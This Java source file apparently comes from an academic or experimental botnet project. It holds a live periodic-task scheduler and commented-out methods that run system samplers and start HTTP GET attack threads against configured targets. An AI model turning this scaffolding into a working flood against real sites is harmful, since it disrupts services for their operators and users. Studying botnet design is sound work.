/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.bot;

import com.acmutv.botnet.config.AppConfigurationService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.concurrent.*;

/**
 * This class realizes static services for bots.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class BotService {

  private static final Logger LOGGER = LogManager.getLogger(BotService.class);

  /*
    Registers both system and network samplers, according to the given configuration.

  public static void registerSamplers() {
    AppConfiguration config = AppConfiguration.getInstance();
    final ScheduledExecutorService scheduler =
        Executors.newScheduledThreadPool(2);

    if (config.isSysStat()) {
      scheduler.scheduleAtFixedRate(
          new SystemSampler(), 0, config.getSysStatFreq(), TimeUnit.SECONDS);
    }

    if (config.isNetStat()) {
      scheduler.scheduleAtFixedRate(
          new NetworkSampler(), 0, config.getNetStatFreq(), TimeUnit.SECONDS);
    }

    scheduler.shutdown();

    long maxtime = config.getMaxTime();
    if (maxtime > 0) {
      try {
        if (scheduler.awaitTermination(maxtime, TimeUnit.SECONDS)) {
          if (config.isDebug()) {
            Logger.info("SAMPLERS THREAD POOL SHUTDOWN");
          }
        }
      } catch (InterruptedException exc) {
        exc.printStackTrace();
      }
    }
  }
   */

  /*
    Registers HTTP attackers, according to the given configuration.

  private static void registerHttpAttacks(HttpAttack attackers[]) {
    AppConfiguration config = AppConfiguration.getInstance();
    int numcores = Runtime.getRuntime().availableProcessors();
    ExecutorService executor = Executors.newFixedThreadPool(numcores);

    for (HttpTarget tgt : config.getHttpTargets()) {
      Runnable attacker = new HttpGetAttack(tgt);
      executor.execute(attacker);
    }

    executor.shutdown();

    long maxtime = config.getMaxTime();
    if (maxtime > 0) {
      try {
        if (executor.awaitTermination(maxtime, TimeUnit.SECONDS)) {
          if (config.isDebug()) {
            Logger.info("ATTACKS THREAD POOL SHUTDOWN");
          }
        }
      } catch (InterruptedException exc) {
        exc.printStackTrace();
      }
    }
  }
   */
  /**
   * Registers a periodic task.
   * @param task the task to execute.
   * @param delay the delay (in seconds) to first execution.
   * @param period the period (in seconds) between executions.
   */
  private static void registerPeriodic(Runnable task, long delay, long period) {
    final ScheduledExecutorService scheduler =
        Executors.newScheduledThreadPool(1);
    final ScheduledFuture<?> handler =
        scheduler.scheduleAtFixedRate(task, delay, period, TimeUnit.SECONDS);

    Runnable interrupt = () -> handler.cancel(true);

    long maxtime = AppConfigurationService.getConfigurations().getMaxTime();
    if (maxtime > 0) {
      scheduler.schedule(interrupt, maxtime, TimeUnit.SECONDS);
    }
  }
}
